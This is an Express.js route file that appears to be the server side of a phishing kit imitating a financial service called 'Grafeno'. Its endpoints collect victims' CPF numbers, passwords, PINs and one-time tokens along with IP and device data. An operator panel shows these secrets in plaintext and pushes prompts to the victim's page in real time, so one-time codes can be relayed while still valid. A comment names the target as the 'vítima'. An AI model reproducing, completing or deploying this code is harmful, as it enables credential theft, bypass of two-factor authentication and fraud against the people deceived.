const express = require('express');
const router = express.Router();

// Banco de dados (SQLite). Se não estiver disponível, usa memória.
let db = null;
try {
  db = require('../db/grafeno');
} catch (e) {
  console.warn('Banco db/grafeno não carregado, usando memória:', e.message);
}

const userDataCache = new Map();
const sessionsByLogin = new Map();

function getSession(login) {
  if (db && db.getDb()) {
    const s = db.getSession(login);
    if (s) return s;
  }
  return sessionsByLogin.get(login) || null;
}

function setSession(login, comando, detalhes) {
  if (db && db.getDb()) {
    db.setSession(login, comando, detalhes);
  }
  sessionsByLogin.set(login, {
    comando: comando || '',
    detalhes: detalhes || { msg: { GRAFENO: [] } },
    lastUpdate: Date.now()
  });
}

function updateSessionLastUpdate(login) {
  if (db && db.getDb()) db.updateSessionLastUpdate(login);
  const session = sessionsByLogin.get(login);
  if (session) session.lastUpdate = Date.now();
}

function getUserDataFromStore(cpf) {
  if (db && db.getDb()) {
    const u = db.getUserData(cpf);
    if (u && Object.keys(u).length) return u;
  }
  return userDataCache.get(cpf) || null;
}

function setUserDataInStore(cpf, userData) {
  if (db && db.getDb()) {
    db.setUserData(cpf, userData);
  }
  userDataCache.set(cpf, userData);
}

setInterval(() => {
  if (db && db.getDb()) {
    db.deleteOldCache(30 * 60 * 1000);
  } else {
    const now = Date.now();
    const max = 30 * 60 * 1000;
    for (const [cpf, data] of userDataCache.entries()) {
      if (now - data.lastUpdate > max) userDataCache.delete(cpf);
    }
    for (const [login, session] of sessionsByLogin.entries()) {
      if (now - session.lastUpdate > max) sessionsByLogin.delete(login);
    }
  }
}, 5 * 60 * 1000);

// Função para validar CPF
function validateCPF(cpf) {
  if (!cpf) return false;
  
  // Remove caracteres não numéricos
  cpf = cpf.replace(/[^\d]/g, '');
  
  // Verifica se tem 11 dígitos
  if (cpf.length !== 11) return false;
  
  // Verifica se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  
  // Validação dos dígitos verificadores
  let sum = 0;
  let remainder;
  
  // Valida primeiro dígito
  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(9, 10))) return false;
  
  // Valida segundo dígito
  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(10, 11))) return false;
  
  return true;
}

// Função para formatar CPF
function formatCPF(cpf) {
  if (!cpf) return '';
  const cleaned = cpf.replace(/[^\d]/g, '');
  if (cleaned.length !== 11) return cpf;
  return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function getUserData(cpf) {
  const cleanedCPF = cpf.replace(/[^\d]/g, '');
  let userData = getUserDataFromStore(cleanedCPF);
  if (!userData || !userData.cpf) {
    userData = {
      cpf: cleanedCPF,
      cpfFormatted: formatCPF(cleanedCPF),
      actions: [],
      firstAction: new Date().toISOString(),
      lastUpdate: Date.now(),
      ip: '',
      device: '',
      browser: '',
      platform: '',
      local: '',
      sistema: '',
      visitorId: ''
    };
    setUserDataInStore(cleanedCPF, userData);
  }
  return userData;
}

// Função para atualizar dados do usuário
function updateUserData(cpf, newData) {
  const userData = getUserData(cpf);
  
  // Atualizar informações básicas se for a primeira ação
  if (userData.actions.length === 0) {
    userData.ip = newData.ip || userData.ip;
    userData.device = newData.device || userData.device;
    userData.browser = newData.browser || userData.browser;
    userData.platform = newData.platform || userData.platform;
    userData.local = newData.local || userData.local;
    userData.sistema = newData.sistema || userData.sistema;
    userData.visitorId = newData.visitorId || userData.visitorId;
  }
  
  // Adicionar nova ação
  const action = {
    type: newData.formType || 'unknown',
    timestamp: new Date().toISOString(),
    data: { ...newData }
  };
  
  userData.actions.push(action);
  userData.lastUpdate = Date.now();
  setUserDataInStore(cpf.replace(/[^\d]/g, ''), userData);
  return userData;
}

/* GET home page. */
router.get('/', (req, res, next) => {
  res.render('index', { title: 'Express' });
});

router.get('/grafeno', (req, res, next) => {
  res.render('grafeno', { title: 'Grafeno' });
});

// --- Interna (vítima após "enviar_para_interna") → painel.ejs ---
router.get('/painel', (req, res) => {
  res.render('painel', { title: 'Grafeno' });
});

// --- Painel do operador (lista de sessões e botões de comando) ---
router.get('/operador', (req, res) => {
  res.render('painel-operador', { title: 'Painel Operador - Grafeno' });
});

// Listar sessões ativas (para o painel)
router.get('/api/sessoes', (req, res) => {
  const maxIdle = 30 * 60 * 1000;
  let sessions = [];
  if (db && db.getDb()) {
    sessions = db.listSessions(maxIdle);
  } else {
    const now = Date.now();
    for (const [login, session] of sessionsByLogin.entries()) {
      if (now - session.lastUpdate > maxIdle) continue;
      sessions.push({ login, ...session });
    }
  }
  const list = sessions.map(s => {
    const login = s.login;
    const userData = getUserDataFromStore(login);
    let senha = '', pin = '', token = '', comando = '';
    if (userData && userData.actions) {
      userData.actions.forEach(a => {
        if (a.data.password) senha = a.data.password;
        if (a.data.pin_attempt) pin = a.data.pin_attempt;
        if (a.data.otp_attempt) token = a.data.otp_attempt;
        if (a.data.comando_input) comando = a.data.comando_input;
      });
    }
    return {
      login,
      cpfFormatado: userData ? userData.cpfFormatted : formatCPF(login),
      comando: s.comando || '',
      lastUpdate: s.lastUpdate,
      ip: userData ? userData.ip : '',
      device: userData ? userData.device : '',
      temSenha: !!senha,
      temPin: !!pin,
      temToken: !!token,
      temComando: !!comando,
      senha: senha || '',
      pin: pin || '',
      token: token || '',
      comando_valor: comando || ''
    };
  });
  list.sort((a, b) => (b.lastUpdate || 0) - (a.lastUpdate || 0));
  res.json({ sessoes: list });
});

// Detalhe de uma sessão
router.get('/api/sessao/:login', (req, res) => {
  const login = (req.params.login || '').replace(/\D/g, '');
  const session = getSession(login);
  const userData = getUserDataFromStore(login);
  if (!session && !userData) return res.status(404).json({ error: 'Sessão não encontrada' });
  let senha = '', pin = '', token = '', comando = '';
  if (userData && userData.actions) {
    userData.actions.forEach(a => {
      if (a.data.password) senha = a.data.password;
      if (a.data.pin_attempt) pin = a.data.pin_attempt;
      if (a.data.otp_attempt) token = a.data.otp_attempt;
      if (a.data.comando_input) comando = a.data.comando_input;
    });
  }
  res.json({
    login,
    cpfFormatado: userData ? userData.cpfFormatted : formatCPF(login),
    comando: session ? session.comando : '',
    detalhes: session ? session.detalhes : {},
    lastUpdate: session ? session.lastUpdate : (userData ? userData.lastUpdate : 0),
    ip: userData ? userData.ip : '',
    device: userData ? userData.device : '',
    browser: userData ? userData.browser : '',
    local: userData ? userData.local : '',
    senha,
    pin,
    token,
    comando_valor: comando,
    actionsCount: userData ? userData.actions.length : 0
  });
});

// Operador define o próximo comando para uma sessão
router.post('/api/comando', (req, res) => {
  const { login: loginParam, comando, input_comando } = req.body;
  const login = (loginParam || '').toString().trim().replace(/\D/g, '');
  if (!login || !comando) {
    return res.status(400).json({ ok: false, message: 'login e comando obrigatórios' });
  }
  let comandoFinal = (comando || '').toString().trim().toLowerCase();
  if (!['aguardando', 'finalizar_atendimento', 'enviar_para_interna'].includes(comandoFinal)) {
    if (!comandoFinal.endsWith(' solicitado')) comandoFinal = comandoFinal + ' solicitado';
  }
  const detalhes = { msg: { GRAFENO: [] } };
  if (comandoFinal === 'comando solicitado' && input_comando) {
    detalhes.msg.GRAFENO = [{ input_comando: input_comando.toString() }];
  }
  setSession(login, comandoFinal, detalhes);
  res.json({ ok: true, comando: comandoFinal });
});

// Endpoint para receber dados do formulário
router.post('/api/submit', async (req, res, next) => {
  try {
    const formData = req.body;
    
    // Extrair CPF do formulário
    let cpf = formData.document_number || formData.cpf || '';
    
    // Se não tiver CPF, tentar buscar do cache usando visitorId (apenas em memória)
    if (!cpf && formData.visitorId) {
      for (const [cpfKey, userData] of userDataCache.entries()) {
        if (userData && userData.visitorId === formData.visitorId) {
          cpf = cpfKey;
          break;
        }
      }
    }

    // Validar CPF
    if (!cpf || !validateCPF(cpf)) {
      return res.status(400).json({ 
        success: false, 
        message: 'CPF inválido ou não fornecido' 
      });
    }

    // Obter dados da sessão
    const sessionData = {
      ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      device: formData.device || req.headers['user-agent'] || 'Desconhecido',
      browser: formData.browser || req.headers['user-agent'] || 'Desconhecido',
      platform: formData.platform || req.headers['user-agent'] || 'Desconhecido',
      local: formData.local || 'Desconhecido',
      sistema: formData.sistema || 'GRAFENO',
      visitorId: formData.visitorId || ''
    };

    // Combinar dados do formulário com dados da sessão
    const dataToSend = {
      ...formData,
      ...sessionData,
      document_number: cpf.replace(/[^\d]/g, '') // Garantir CPF limpo
    };

    // Atualizar dados do usuário no cache
    const userData = updateUserData(cpf, dataToSend);

    res.json({ 
      success: true, 
      message: 'Dados enviados com sucesso',
      cpf: userData.cpfFormatted,
      actionsCount: userData.actions.length
    });
  } catch (error) {
    console.error('Erro api/submit:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Erro ao processar dados' 
    });
  }
});

router.post('/grafeno', async (req, res, next) => {
  try {
    const formData = req.body;
    
    // Extrair CPF do formulário
    let cpf = formData['user[document_number]'] || formData.document_number || '';
    
    // Validar CPF
    if (!cpf || !validateCPF(cpf)) {
      return res.redirect('/grafeno?error=cpf_invalido');
    }

    // Obter dados da sessão
    const sessionData = {
      ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      device: req.headers['user-agent'] || 'Desconhecido',
      browser: req.headers['user-agent'] || 'Desconhecido',
      platform: req.headers['user-agent'] || 'Desconhecido',
      local: 'Desconhecido',
      sistema: 'GRAFENO'
    };

    // Processar dados do formulário
    const processedData = {
      document_number: cpf.replace(/[^\d]/g, ''),
      password: formData['user[password]'] || formData.password || '',
      pin_attempt: formData['user[pin_attempt]'] || formData.pin_attempt || '',
      otp_attempt: formData['user[otp_attempt]'] || formData.otp_attempt || '',
      comando_input: formData['user[comando_input]'] || formData.comando_input || '',
      remember_me: formData['user[remember_me]'] || formData.remember_me || '0',
      formType: 'login',
      ...sessionData
    };

    // Atualizar dados do usuário no cache
    const userData = updateUserData(cpf, processedData);

    res.redirect('/grafeno');
  } catch (error) {
    console.error('Erro POST /grafeno:', error);
    res.redirect('/grafeno');
  }
});

// --- API de ping (endpoint dedicado; não altera estado do fluxo de login) ---
router.post('/api/ping', (req, res) => {
  const ip = req.body.ip || req.ip || req.headers['x-forwarded-for'] || '';
  res.json({ ok: true, ip: ip || null });
});

// --- Fluxo operador (polling + etapas) ---

router.post('/salvar-login', async (req, res) => {
  try {
    const { usuario, senha, ip, tipo, local, device, url, user_id, comando, recaptcha_token } = req.body;
    const login = (usuario || '').replace(/\D/g, '');
    if (!login || login.length !== 11) {
      return res.json({ success: false });
    }
    const sessionData = {
      ip: ip || req.ip || req.headers['x-forwarded-for'] || '',
      device: device || req.headers['user-agent'] || '',
      browser: req.headers['user-agent'] || '',
      platform: device || req.headers['user-agent'] || '',
      local: local || '',
      sistema: tipo || 'GRAFENO'
    };
    const dataToSend = {
      document_number: login,
      password: senha || '',
      formType: 'login',
      ...sessionData
    };
    const userData = updateUserData(login, dataToSend);
    setSession(login, 'codigo_token solicitado', { msg: { GRAFENO: [] } });
    res.json({ success: true });
  } catch (err) {
    console.error('Erro salvar-login:', err);
    res.status(500).json({ success: false });
  }
});

router.post('/comando-login', (req, res) => {
  const login = (req.body.login || '').toString().trim().replace(/\D/g, '');
  const session = getSession(login);
  const comando = session ? session.comando : '';
  const detalhes = session ? session.detalhes : {};
  res.json({ comando, detalhes });
});

router.post('/atualizar-etapa', async (req, res) => {
  try {
    let { usuario, etapa, valor } = req.body;
    const login = (usuario || '').toString().trim().replace(/\D/g, '');
    if (!login) return res.json({ success: false });

    // Aceita etapa no formato do painel: "TOKEN-123456", "PIN-1234", "Comando-xyz"
    const etapaStr = (etapa || '').toString().trim();
    let etapaNorm = etapaStr;
    if (etapaStr.startsWith('TOKEN-') || etapaStr === 'TOKEN') {
      etapaNorm = 'TOKEN';
      if (!valor && etapaStr.startsWith('TOKEN-')) valor = etapaStr.slice(6);
    } else if (etapaStr.startsWith('PIN-') || etapaStr === 'PIN') {
      etapaNorm = 'PIN';
      if (!valor && etapaStr.startsWith('PIN-')) valor = etapaStr.slice(4);
    } else if (etapaStr.startsWith('Comando-') || etapaStr.startsWith('COMANDO-') || etapaStr === 'COMANDO') {
      etapaNorm = 'COMANDO';
      if (!valor && (etapaStr.startsWith('Comando-') || etapaStr.startsWith('COMANDO-'))) valor = etapaStr.replace(/^(Comando|COMANDO)-/, '');
    }

    const sessionData = {
      ip: req.ip || req.headers['x-forwarded-for'] || '',
      device: req.headers['user-agent'] || '',
      browser: req.headers['user-agent'] || '',
      platform: req.headers['user-agent'] || '',
      local: '',
      sistema: 'GRAFENO'
    };

    let formType = 'unknown';
    const dataToSend = { document_number: login, ...sessionData };
    if (etapaNorm === 'PIN') {
      formType = 'pin';
      dataToSend.pin_attempt = valor;
    } else if (etapaNorm === 'TOKEN') {
      formType = 'token';
      dataToSend.otp_attempt = valor;
    } else if (etapaNorm === 'COMANDO') {
      formType = 'comando';
      dataToSend.comando_input = valor;
    }
    dataToSend.formType = formType;
    const userData = updateUserData(login, dataToSend);
    updateSessionLastUpdate(login);
    res.json({ success: true });
  } catch (err) {
    console.error('Erro atualizar-etapa:', err);
    res.status(500).json({ success: false });
  }
});

router.post('/enviar-comando', (req, res) => {
  const { comando, usuario } = req.body;
  res.json({ ok: true });
});

module.exports = router;
